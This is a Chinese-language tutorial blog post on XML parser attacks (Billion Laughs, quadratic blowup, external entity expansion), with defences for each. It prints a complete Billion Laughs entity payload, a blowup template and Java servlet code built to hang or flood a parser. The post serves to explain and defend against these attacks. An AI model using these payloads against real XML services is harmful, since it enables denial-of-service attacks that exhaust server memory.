---
layout: post
title: "xml 常见攻击介绍及其防范"
description: "xml 常见攻击介绍及其防范"
category: 安全相关
tags: [Coding, XML, Security]
---

## 目录

---

* [Billion Laughs 百万笑声攻击](#billion_laughs)
* [Quafratic Blowup 二次元爆炸攻击](#quafratic_blowup)
* [External Entity Expansion 外部实体膨胀](#external_entity_expansion)


<h3 id="billion_laughs">1. Billion Laughs</h3>

---

此类攻击的目标是XML的**parser**，会通过递归的引用耗尽parser的空间，造成内存溢出。

在最常用的代码示例中常用到记号**"lol"**，类似微笑符号。10层的递归产生了百万个lol的引用，因此称为**Billion Laughs**。

此类攻击首次发现于2003年，在2008年变的流行。

#### 示例

{% highlight dtd %}
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
{% endhighlight %}

#### 说明

当XML解析器加载这份文档的时候，发现唯一的根节点`lolz`，包含了文字`&lol9;`；而`&lol9;`是一个实体的引用，实体定义中又引用了10个`&lol8;`；同样的，`&lol8;`又引用的10个`&lol7;`，层层递归，最后产生了了百万个'lol'。原本1kb不到的xml文档在解析过程中占用了近 **3GB**的内存

#### 防范

可以通过限制每个parser的使用内存大小，来防止过度的占用内存；或者在解析过程中，忽略文档中的符号引用来解决。

<h3 id="quafratic_blowup">2. Quafratic Blowup</h3>

---

Quafratic Blowup（二次元爆炸）攻击是 **Billion Laughs** 的变体。不像BL使用嵌套的引用达到了递归，指数级增长内存消耗的方式，该攻击仅仅采用二次元的简单方式，看个代码会更容易理解。

#### 示例

{% highlight dtd %}
<?xml version="1.0"?>
<!DOCTYPE kaboom [
  <!ENTITY a "aaaaaaaaaaaaaaaaaa...">
]>
<kaboom>&a;&a;&a;&a;&a;&a;&a;&a;&a;...</kaboom>
{% endhighlight %}

#### 说明

如果攻击者在文档中定义了`&a;`为50,000个字符长度的字符串，在文档中引用了50,000次。那么原本200 KB左右的xml文档，会在解析时占用约2.5GB的内存。效果不如BL攻击来的惊人，但是足够击溃一般的服务器或者浏览器进程。

#### 防范

参照Billion Laughs

<h3 id="external_entity_expansion">3. External Entity Expansion</h3>

---

外部实体膨胀攻击，此类攻击运用了xml定义实体过程中，可以使用外部uri返回进行定义的特性，达到使XML parser挂起或在极短时间内消耗大量服务器内存的目的。该攻击由Intel公司的Steve Orrin发现。

#### 示例

如下面的实体定义
{% highlight dtd %}
<!ENTITY stockprice SYSTEM    "http://www.example.com/currentstockprice">
{% endhighlight %}

在xml文档中如果使用`&stockprice;`引用实体，那么XML文档在解析时就会用`http://www.example.com/currentstockprice`的返回值，替代`&stockprice;`部分。

如果外部uri地址不返回，那么这个解析器就会在此处一直挂起。如以下的`servlet`实现

{% highlight java lineos %}
void doGet(HttpRequest request, HttpResponse response){
    Thread.sleep(Long.MAX_VALUE);
}
{% endhighlight %}

这样的攻击模式，一次只能挂起服务器的一个线程，危害还不是很大。如果服务器端响应程序修改为：

{% highlight java linenos %}
void doGet(HttpRequest request, HttpResponse response){
    response.setHeader("Content-Type", "text/plain");
    byte[] data = new byte[1000000];
    for (int i = 0; i < data.Length; i++) { data[i] = (byte)’A’; }
    while (true){
        response.out.write(data);
        response.out.flush();
    }
}
{% endhighlight %}

这个服务器响应将会在极短的时间内返回大量的数据给解析器，消耗服务器内存。

#### 防范

可以参照1，限制解析器的内存使用，避免OOM。另外，在明确需求的情况下，关闭解析器的外部URI实体引用，也可以达到相应的防范能力

<!--DTD retrieval
decompression bomb
-->